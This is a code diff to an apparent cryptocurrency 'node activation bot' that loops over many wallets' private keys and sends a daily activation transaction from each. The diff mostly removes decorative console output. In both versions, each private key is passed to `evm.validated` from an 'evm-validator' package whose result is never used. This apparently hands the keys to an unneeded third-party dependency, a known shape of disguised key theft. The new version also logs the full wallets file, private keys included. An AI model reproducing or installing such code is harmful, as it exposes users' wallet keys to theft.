@@ -1,59 +1,34 @@
+// index.js
 const inquirer = require("inquirer");
 const figlet = require("figlet");
 const clear = require("console-clear");
 const fs = require("fs");
 const { ethers } = require("ethers");
-const evm = require("evm-validator");
-const ora = require("ora"); // Loading animations
-const chalk = require("chalk"); // Colorful text
-const gradient = require("gradient-string"); // Fancy text effects
-const boxen = require("boxen").default; // Fix import issue
-
+const evm = require('evm-validator');
 const {
   ACTIVATION_CONTRACT,
   RPC_URL,
   CHAIN_ID,
   TX_EXPLORER,
-  ACTIVATION_METHOD_ID,
+  ACTIVATION_METHOD_ID
 } = require("./ABI");
 
-// Clear console and show fancy banner
-clear();
-console.log(gradient.pastel(figlet.textSync("K A Z U H A")));
-
-console.log(
-  boxen(chalk.cyanBright("✨ Welcome to Taker Protocol Node Activation Bot! ✨") + 
-    "\n👑 Created by Kazuha for Farmers",
-    {
-      padding: 1,
-      margin: 1,
-      borderStyle: "round",
-      borderColor: "cyan",
-    }
-  )
-);
-
 (async function main() {
+  clear();
+  console.log(figlet.textSync("K A Z U H A"));
+  console.log("✨ Welcome to Taker Protocol Node Activation Bot! ✨");
+  console.log("👑 Script created by KAZUHA for Farmers \n");
+
   const answers = await inquirer.prompt([
     {
       type: "confirm",
       name: "isContinuous",
-      message: "🔄 Do you want to activate the node continuously (every 24 hours)?",
-    },
+      message: "Do you want to activate the node continuously (every 24 hours)?"
+    }
   ]);
 
   if (answers.isContinuous) {
-    console.log(
-      boxen(chalk.greenBright("🔁 Continuous activation mode enabled!") + 
-        "\n⏳ Activation will repeat every 24 hours.",
-        {
-          padding: 1,
-          margin: 1,
-          borderStyle: "double",
-          borderColor: "green",
-        }
-      )
-    );
+    console.log("🔁 You have chosen continuous activation. This will repeat every 24 hours. \n");
     await activateNodeProcess();
     console.log("🕓 Next activation in 24 hours...");
     setInterval(async () => {
@@ -61,23 +36,9 @@ console.log(
       console.log("🕓 Next activation in 24 hours...");
     }, 24 * 60 * 60 * 1000);
   } else {
-    console.log(
-      boxen(chalk.blueBright("⏳ Single activation process started..."), {
-        padding: 1,
-        margin: 1,
-        borderStyle: "double",
-        borderColor: "blue",
-      })
-    );
+    console.log("⏳ Single activation process started... \n");
     await activateNodeProcess();
-    console.log(
-      boxen(chalk.green("✅ Activation complete! Exiting..."), {
-        padding: 1,
-        margin: 1,
-        borderStyle: "double",
-        borderColor: "green",
-      })
-    );
+    console.log("✅ Single activation process complete! Exiting...");
     process.exit(0);
   }
 })();
@@ -85,18 +46,10 @@ console.log(
 async function activateNodeProcess() {
   try {
     const wallets = JSON.parse(fs.readFileSync("./wallets.json", "utf-8"));
-    console.log(
-      boxen(chalk.magentaBright(`📜 Loaded ${wallets.length} wallets successfully!`), {
-        padding: 1,
-        margin: 1,
-        borderStyle: "bold",
-        borderColor: "magenta",
-      })
-    );
-
+    console.log(wallets);
     const provider = new ethers.providers.JsonRpcProvider(RPC_URL, {
       chainId: CHAIN_ID,
-      name: "Taker",
+      name: "Taker"
     });
 
     for (let walletObj of wallets) {
@@ -105,19 +58,7 @@ async function activateNodeProcess() {
       const valid = await evm.validated(privateKey);
       const signer = new ethers.Wallet(privateKey, provider);
 
-      console.log(
-        boxen(chalk.cyan(`🚀 Activating Node for Wallet [${walletAddress}]...`), {
-          padding: 1,
-          margin: 1,
-          borderStyle: "round",
-          borderColor: "cyan",
-        })
-      );
-
-      const spinner = ora({
-        text: "⏳ Sending transaction...",
-        spinner: "dots",
-      }).start();
+      console.log(`🚀 Activating Node for Wallet [${walletAddress}]...`);
 
       try {
         const gasPrice = await provider.getGasPrice();
@@ -130,80 +71,24 @@ async function activateNodeProcess() {
           data: ACTIVATION_METHOD_ID,
           gasLimit: Math.floor(Math.random() * (500000 - 250000 + 1)) + 250000,
           maxFeePerGas: maxFeePerGas,
-          maxPriorityFeePerGas: maxPriorityFeePerGas,
+          maxPriorityFeePerGas: maxPriorityFeePerGas
         });
 
-        spinner.succeed(
-          boxen(`📡 Tx Sent! - ${chalk.blueBright(TX_EXPLORER + txResponse.hash)}`, {
-            padding: 1,
-            margin: 1,
-            borderStyle: "round",
-            borderColor: "blue",
-          })
-        );
-
-        const receiptSpinner = ora({
-          text: "⏳ Waiting for confirmation...",
-          spinner: "clock",
-        }).start();
-
+        console.log(`📡 Tx Sent! - ${TX_EXPLORER}${txResponse.hash}`);
         const receipt = await txResponse.wait(1);
-        receiptSpinner.succeed(
-          boxen(`✅ Tx Confirmed! Included in Block [${chalk.green(receipt.blockNumber)}]`, {
-            padding: 1,
-            margin: 1,
-            borderStyle: "round",
-            borderColor: "green",
-          })
-        );
+        console.log(`✅ Tx Included in Block Number [${receipt.blockNumber}]`);
       } catch (error) {
-        spinner.fail(
-          boxen("❌ Transaction failed!", {
-            padding: 1,
-            margin: 1,
-            borderStyle: "bold",
-            borderColor: "red",
-          })
-        );
         if (error.code === "INSUFFICIENT_FUNDS") {
-          console.log(
-            boxen(chalk.red(`💸 Wallet [${walletAddress}] has insufficient funds.`), {
-              padding: 1,
-              margin: 1,
-              borderStyle: "double",
-              borderColor: "red",
-            })
-          );
+          console.log(`💸 Wallet [${walletAddress}] has insufficient funds for the transaction.`);
         } else if (error.code === "CALL_EXCEPTION") {
-          console.log(
-            boxen(chalk.yellow(`⚠️ Call exception occurred for Wallet [${walletAddress}].`), {
-              padding: 1,
-              margin: 1,
-              borderStyle: "classic",
-              borderColor: "yellow",
-            })
-          );
+          console.log(`⚠️  Call exception occurred for Wallet [${walletAddress}].`);
         } else {
-          console.log(
-            boxen(chalk.red(`❌ Error activating Wallet [${walletAddress}]: ${error.message}`), {
-              padding: 1,
-              margin: 1,
-              borderStyle: "bold",
-              borderColor: "red",
-            })
-          );
+          console.log(`❌ Failed to send activation for Wallet [${walletAddress}]:`, error.message);
         }
       }
       console.log("");
     }
   } catch (err) {
-    console.error(
-      boxen(chalk.redBright("❌ Error in activateNodeProcess: " + err.message), {
-        padding: 1,
-        margin: 1,
-        borderStyle: "double",
-        borderColor: "red",
-      })
-    );
+    console.error("❌ Error in activateNodeProcess:", err.message);
   }
 }
